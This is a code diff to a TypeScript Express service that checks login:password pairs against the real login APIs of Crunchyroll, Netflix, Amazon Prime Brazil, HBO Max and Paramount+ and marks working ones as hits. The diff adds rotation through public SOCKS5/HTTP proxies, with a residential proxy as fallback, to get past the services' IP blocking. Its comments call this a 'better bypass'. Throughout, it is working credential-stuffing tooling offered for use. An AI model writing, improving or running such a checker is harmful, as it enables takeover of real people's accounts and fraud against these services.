@@ -2,7 +2,7 @@ import { Router, type IRouter } from "express";
 import { createHash }  from "node:crypto";
 import { execFile }    from "node:child_process";
 import { unlinkSync }  from "node:fs";
-import { getResidentialCreds } from "./proxies.js";
+import { getResidentialCreds, proxyCache } from "./proxies.js";
 
 const router: IRouter = Router();
 
@@ -93,8 +93,56 @@ const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 function getResidentialProxyArgs(): string[] {
   const c = getResidentialCreds();
   if (!c) return [];
-  // Use credentials exactly as configured — the proxy provider handles IP rotation
   return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
+}
+
+// ── Retry-with-proxy helper ───────────────────────────────────────────────────
+// Calls `fn(proxyArgs)` up to `maxAttempts` times, picking a fresh proxy on
+// each proxy-level connection failure (curl exit-code, timeout, SOCKS error).
+// Returns the first successful CurlResult (even a 4xx/5xx counts as success —
+// it means the proxy connected and the server responded).
+async function runCurlWithProxyRetry(
+  fn:          (proxyArgs: string[]) => string[],
+  timeoutMs:   number,
+  maxAttempts  = 3,
+): Promise<CurlResult> {
+  let lastErr: Error = new Error("no_attempts");
+  for (let i = 0; i < maxAttempts; i++) {
+    const proxyArgs = getStreamingProxyArgs();
+    try {
+      return await runCurl(fn(proxyArgs), timeoutMs);
+    } catch (e) {
+      lastErr = e instanceof Error ? e : new Error(String(e));
+      // Only retry on connection-level failures (curl exited non-zero)
+      if (!lastErr.message.includes("Command failed") &&
+          !lastErr.message.includes("CURL_TIMEOUT")) break;
+    }
+  }
+  throw lastErr;
+}
+
+// ── Streaming proxy args: public SOCKS5 first, residential fallback ───────────
+// Priority order:
+//   1. Public SOCKS5 — tunnels HTTPS natively, no CONNECT needed
+//   2. Public HTTP   — may or may not support CONNECT
+//   3. Residential   — last resort (current provider blocks CONNECT for HTTPS)
+function getStreamingProxyArgs(): string[] {
+  const pool  = proxyCache.filter(p => !p.username);       // public proxies only
+  const socks5 = pool.filter(p => p.type === "socks5");
+  const http   = pool.filter(p => p.type === "http");
+
+  // Prefer SOCKS5 — handles HTTPS without CONNECT
+  const candidates = socks5.length > 0 ? socks5 : http;
+  if (candidates.length > 0) {
+    const top  = candidates.slice(0, 50);                   // top-50 fastest
+    const pick = top[Math.floor(Math.random() * top.length)];
+    // socks5h = DNS also resolved via proxy (better bypass)
+    const scheme = pick.type === "socks5" ? "socks5h" : "http";
+    return ["-x", `${scheme}://${pick.host}:${pick.port}`];
+  }
+
+  // No public proxies yet — fall back to residential
+  return getResidentialProxyArgs();
 }
 const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";
 
@@ -1167,19 +1215,16 @@ const CR_TIMEOUT     = 25_000;
 
 async function checkCrunchyroll(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   try {
-    const result = await runCurl([
+    const result = await runCurlWithProxyRetry(px => [
       "--compressed", "-L", "--max-redirs", "3",
-      ...proxyArgs,
+      ...px,
       "-H", `User-Agent: ${CR_UA}`,
       "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
       "-H", "Content-Type: application/x-www-form-urlencoded",
       "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
       "https://auth.crunchyroll.com/auth/v1/token",
-    ], CR_TIMEOUT);
+    ], CR_TIMEOUT, 3);
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
       let detail = "authenticated";
@@ -1244,10 +1289,18 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
       .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
 
     // Step 2 — POST credentials to Shakti API
+    // Netflix Shakti blocks datacenter IPs with 421 — use proxy with automatic retry
+    const nfBody = JSON.stringify({
+      userLoginId: login, password, rememberMe: true,
+      flow: "websiteSignUp", mode: "login", action: "loginAction",
+      withFields: "rememberMe,nextPage,userLoginId,password,countryCode,currentFlowContext",
+      authURL, nextPage: "", showPassword: "",
+    });
     let postResult: CurlResult;
     try {
-      postResult = await runCurl([
+      postResult = await runCurlWithProxyRetry(px => [
         "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+        ...px,
         "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/json",
@@ -1255,14 +1308,9 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
         "-H", "Origin: https://www.netflix.com",
         "-H", "Accept: application/json, text/javascript",
         "-H", "X-Netflix.is.user.unauthenticated: true",
-        "--data-raw", JSON.stringify({
-          userLoginId: login, password, rememberMe: true,
-          flow: "websiteSignUp", mode: "login", action: "loginAction",
-          withFields: "rememberMe,nextPage,userLoginId,password,countryCode,currentFlowContext",
-          authURL, nextPage: "", showPassword: "",
-        }),
+        "--data-raw", nfBody,
         `https://www.netflix.com/api/shakti/${buildId}/login`,
-      ], NF_TIMEOUT);
+      ], NF_TIMEOUT, 3);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
@@ -1300,22 +1348,19 @@ const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_ag
 
 async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
     let getResult: CurlResult;
     try {
-      getResult = await runCurl([
+      getResult = await runCurlWithProxyRetry(px => [
         "--compressed", "-L", "--max-redirs", "5",
-        ...proxyArgs,
+        ...px,
         "-c", cookieFile, "-b", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "-H", "Accept-Language: pt-BR,pt;q=0.9",
         AMZ_SIGNIN,
-      ], AMZ_TIMEOUT);
+      ], AMZ_TIMEOUT, 3);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
     }
@@ -1345,9 +1390,9 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
 
     let postResult: CurlResult;
     try {
-      postResult = await runCurl([
+      postResult = await runCurlWithProxyRetry(px => [
         "--compressed", "-L", "--max-redirs", "8",
-        ...proxyArgs,
+        ...px,
         "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/x-www-form-urlencoded",
@@ -1355,7 +1400,7 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
         "-H", "Origin: https://www.amazon.com.br",
         "--data-raw", postBody,
         formAction,
-      ], AMZ_TIMEOUT);
+      ], AMZ_TIMEOUT, 3);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
@@ -1392,9 +1437,6 @@ const MAX_CLIENT_ID = "max-mobile-android";
 
 async function checkHBOMax(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   try {
     const payload = JSON.stringify({
       grant_type: "password",
@@ -1403,15 +1445,15 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       client_id:  MAX_CLIENT_ID,
     });
 
-    const result = await runCurl([
+    const result = await runCurlWithProxyRetry(px => [
       "--compressed", "-L", "--max-redirs", "3",
-      ...proxyArgs,
+      ...px,
       "-H", `User-Agent: ${HBO_UA}`,
       "-H", "Content-Type: application/json",
       "-H", "Accept: application/json",
       "--data-raw", payload,
       "https://api.max.com/v1/oauth/token",
-    ], HBO_TIMEOUT);
+    ], HBO_TIMEOUT, 3);
 
     if (result.statusCode === 200 && result.body.includes("access_token"))
       return { credential, login, status: "HIT", detail: "max_authenticated" };
@@ -1541,19 +1583,16 @@ const PP_UA      = "Paramount+/8.1.0 (Android 13; Dalvik/2.1.0)";
 
 async function checkParamount(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   try {
-    const result = await runCurl([
+    const result = await runCurlWithProxyRetry(px => [
       "--compressed", "-L", "--max-redirs", "3",
-      ...proxyArgs,
+      ...px,
       "-H", `User-Agent: ${PP_UA}`,
       "-H", "Content-Type: application/json",
       "-H", "Accept: application/json",
       "--data-raw", JSON.stringify({ flwSeq: 1, ln: login, pwd: password, type: "login", rememberMe: "true" }),
       "https://www.paramountplus.com/apps/api/v3.0/androidtv/login/",
-    ], PP_TIMEOUT);
+    ], PP_TIMEOUT, 3);
 
     const body = result.body;
     const bLow = body.toLowerCase();
